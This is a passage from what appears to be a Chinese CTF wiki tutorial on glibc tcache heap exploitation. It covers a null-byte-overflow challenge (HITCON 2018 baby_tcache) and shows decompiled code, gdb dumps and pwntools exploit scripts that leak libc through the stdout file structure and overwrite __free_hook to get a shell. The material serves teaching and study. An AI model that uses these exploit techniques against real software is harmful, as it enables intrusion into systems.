<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># Your exploit script goes here</span>

    <span class="c1"># step 1: get three unsortedbin chunks</span>
    <span class="c1"># note that to avoid top consolidation, we need to arrange them like:</span>
    <span class="c1"># tcache * 6 -&gt; unsortd  * 3 -&gt; tcache</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - unsorted&#39;</span><span class="p">)</span> <span class="c1"># three unsorted bin chunks</span>

    <span class="c1"># arrange:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="c1"># step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>

    <span class="c1"># rearrange to take second unsorted bin into tcache chunk, but leave first </span>
    <span class="c1"># unsorted bin unchanged</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;7 - first&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;8 - second&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;9 - third&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="c1"># move second into tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="c1"># delete first to provide valid fd &amp; bk</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>

    <span class="n">new</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;0 - overflow&#39;</span><span class="p">)</span>
    <span class="c1"># fill up tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

    <span class="c1"># trigger</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

    <span class="c1"># step 3: leak, fill up </span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; - tcache&#39;</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;8 - fillup&#39;</span><span class="p">)</span>

    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)))</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>

    <span class="c1"># step 4: constrecvuntilct UAF, write into __free_hook</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;9 - next&#39;</span><span class="p">)</span>
    <span class="c1"># these two provides sendlineots for tcache</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span> <span class="c1"># 0</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">into target&#39;</span><span class="p">)</span> <span class="c1"># 1</span>
    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span> 
    <span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

    <span class="c1"># system(&quot;/bin/sh\x00&quot;)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
<h4 id="challenge-2-hitcon-2018-pwn-baby_tcache">Challenge 2 : HITCON 2018 PWN baby_tcache<a class="headerlink" href="#challenge-2-hitcon-2018-pwn-baby_tcache" title="Permanent link">&para;</a></h4>
<h5 id="_6">基本信息<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h5>
<p>远程环境中的 libc 是 libc-2.27.so 和上面的题目一样。</p>
<div class="highlight"><pre><span></span><code>zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/hitcon2018/pwn1/baby_tcache&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre></div>
<h5 id="_7">基本功能<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
<p>程序的功能很简单 ，就2个功能 ，一个功能为 New 申请使用内存不大于 0x2000 的 chunk ，总共可以申请 10 块 ，通过 bss 段上的一个全局数组 arr 来管理申请的 chunk ，同时 bss 段上的数组 size_arr 来存储相应 chunk 的申请大小 size 。</p>
<p>程序的另外一个功能就是 delete ，删除所选的堆块 ，删除之前会事先把 chunk 的内容区域按照申请的 size 覆盖成 0xdadadada 。</p>
<p>程序的漏洞代码在功能 New 的时候 ，写完数据后 ，有一个 null-byte 溢出漏洞 ，具体如下 ：</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">new</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;:(&quot;</span><span class="p">);</span>
      <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">bss_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size:&quot;</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">str2llnum</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x2000</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">-2</span><span class="p">);</span>
  <span class="n">malloc_p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">malloc_p</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Data:&quot;</span><span class="p">);</span>
  <span class="n">read_input</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">malloc_p</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">malloc_p</span><span class="p">[</span><span class="n">size</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                           <span class="c1">// null byte bof</span>
  <span class="n">bss_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc_p</span><span class="p">;</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">size_arr</span><span class="p">;</span>
  <span class="n">size_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h5 id="_8">利用思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
<p>程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。</p>
<p>于是有两种思路：</p>
<ol>
<li>
<p>可以考虑 partial overwrite 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 <code>__free_hook</code> chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 <code>__free_hook</code> 里面写上 unsortedbin addr ，后面把 <code>__free_hook</code> 分配出来 ，再利用 partial overwrite 在 <code>__free_hook</code> 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要 4096 次</p>
</li>
<li>
<p>通过 IO file 进行泄露。题目中使用到了 <code>puts</code> 函数，会最终调用到 <code>_IO_new_file_overflow</code>，该函数会最终使用 <code>_IO_do_write</code> 进行真正的输出。在输出时，如果具有缓冲区，会输出 <code>_IO_write_base</code> 开始的缓冲区内容，直到 <code>_IO_write_ptr</code> （也就是将 <code>_IO_write_base</code> 一直到 <code>_IO_write_ptr</code> 部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中），但是在 <code>setbuf</code> 后，理论上会不使用缓冲区。然而如果能够修改 <code>_IO_2_1_stdout_</code> 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 <code>_IO_write_base</code> 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。</p>
</li>
</ol>
<p>思路 2 中涉及到的相关代码：</p>
<p><code>puts</code> 函数最终会调用到该函数，我们需要满足部分 flag 要求使其能够进入 <code>_IO_do_write</code>：</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span>
<span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> 
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> 
    <span class="p">{</span>
      <span class="o">:</span>
      <span class="o">:</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>  <span class="c1">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span>
                                                <span class="c1">// 存在有价值的地址 （libc 地址）则可进行泄露</span>
                                                <span class="c1">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span>
             <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</code></pre></div>
<p>进入后的部分：</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span>
<span class="n">_IO_size_t</span>
<span class="n">new_do_write</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>  <span class="cm">/* 需要满足 */</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,</span>
<span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is</span>
<span class="cm">       not needed nor desirable for Unix- or Posix-like systems.</span>
<span class="cm">       Instead, just indicate that offset (before and after) is</span>
<span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="p">............</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span> <span class="c1">// 这里真正进行 write</span>
</code></pre></div>
<p>可以看到，为调用到目标函数位置，需要满足部分 flags 要求，具体需要满足的 flags ：</p>
<div class="highlight"><pre><span></span><code><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span>  <span class="c1">// Magic number</span>
<span class="n">_flags</span> <span class="o">&amp;</span> <span class="o">=</span> <span class="o">~</span><span class="n">_IO_NO_WRITES</span> <span class="c1">// _flags = 0xfbad0000</span>
<span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_CURRENTLY_PUTTING</span> <span class="c1">// _flags = 0xfbad0800</span>
<span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_IS_APPENDING</span> <span class="c1">// _flags = 0xfbad1800</span>
</code></pre></div>
<h5 id="_9">操作过程<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
<ul>
<li>形成 overlapping chunk</li>
</ul>
<div class="highlight"><pre><span></span><code>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>   <span class="c1"># 1</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># 2</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># 3</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># 4</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 5</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>  <span class="c1"># 6  gap to top</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x60\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># set the prev size</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>  <span class="c1"># backward coeleacsing</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250: 0x0000000000000000  0x0000000000000b61  ( free(#5) ==&gt; merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260: 0x00007fa8a0a3fca0  0x00007fa8a0a3fca0
0x555d56ed6270: 0x0000000000000000  0x0000000000000000
0x555d56ed6280: 0xdadadadadadadada  0xdadadadadadadada
...............
0x555d56ed6740: 0xdadadadadadadada  0xdadadadadadadada
0x555d56ed6750: 0x0000000000000500  0x0000000000000040   #1
0x555d56ed6760: 0x0000000000000061(&#39;a&#39;) 0x0000000000000000
0x555d56ed6770: 0x0000000000000000  0x0000000000000000
0x555d56ed6780: 0x0000000000000000  0x0000000000000000
0x555d56ed6790: 0x0000000000000000  0x0000000000000051   #2
0x555d56ed67a0: 0x0000000000000000  0xdadadadadadadada
...............
0x555d56ed67e0: 0x0000000000000000  0x0000000000000061   #3
0x555d56ed67f0: 0x0000000000000061(&#39;a&#39;) 0x0000000000000000
0x555d56ed6800: 0x0000000000000000  0x0000000000000000
...............
0x555d56ed6830: 0x0000000000000000  0x0000000000000000
0x555d56ed6840: 0x0000000000000000  0x0000000000000071   #4
0x555d56ed6850: 0x4141414141414141  0x4141414141414141
...............
0x555d56ed68b0: 0x0000000000000660  0x0000000000000500   #5
...............
</code></pre></div>
<ul>
<li>改写文件结构体的相关字段</li>
</ul>
<div class="highlight"><pre><span></span><code>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x9</span><span class="o">+</span><span class="mh">0x34</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x60\x07</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># corrupt the fd</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># overwrite the file-structure !!!</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>gdb-peda$ x/20xg stdout
0x7fa8a0a40760 &lt;_IO_2_1_stdout_&gt;:   0x00000000fbad1800(!!!) 0x0000000000000000(!!!)
0x7fa8a0a40770 &lt;_IO_2_1_stdout_+16&gt;:    0x0000000000000000(!!!) 0x0000000000000000(!!!)
0x7fa8a0a40780 &lt;_IO_2_1_stdout_+32&gt;:    0x00007fa8a0a40700(!!!_IO_write_base)   0x00007fa8a0a407e3
0x7fa8a0a40790 &lt;_IO_2_1_stdout_+48&gt;:    0x00007fa8a0a407e3  0x00007fa8a0a407e3
0x7fa8a0a407a0 &lt;_IO_2_1_stdout_+64&gt;:    0x00007fa8a0a407e4  0x0000000000000000
0x7fa8a0a407b0 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000  0x0000000000000000
0x7fa8a0a407c0 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000  0x00007fa8a0a3fa00
0x7fa8a0a407d0 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001  0xffffffffffffffff
0x7fa8a0a407e0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000  0x00007fa8a0a418c0
0x7fa8a0a407f0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff  0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000  0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff  0x0000000000000000
0x7fa8a0a40720 &lt;_IO_2_1_stderr_+160&gt;:   0x00007fa8a0a3f780  0x0000000000000000
</code></pre></div>
<ul>
<li>文件结构体更改缘由</li>
<li>
<p>通过修改 stdout-&gt;_flags 使得程序流能够流到 _IO_do_write (f , f-&gt;_IO_write_base , f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) 这个函数</p>
</li>
<li>
<p>完整 exp</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./baby_tcache&#39;</span><span class="p">),</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;LD_PRELOAD&quot;</span><span class="p">:</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">})</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">opt</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Size:&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;Data:&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Index:&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># 1</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="c1"># 2</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 3</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1"># 4</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="c1"># 5</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span> <span class="c1"># 6  gap to avoid top consolidation</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x60\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># set the prev size</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1"># backward coeleacsing</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span> <span class="o">-</span> <span class="mh">0x9</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x60\x07</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># corrupt the fd</span>

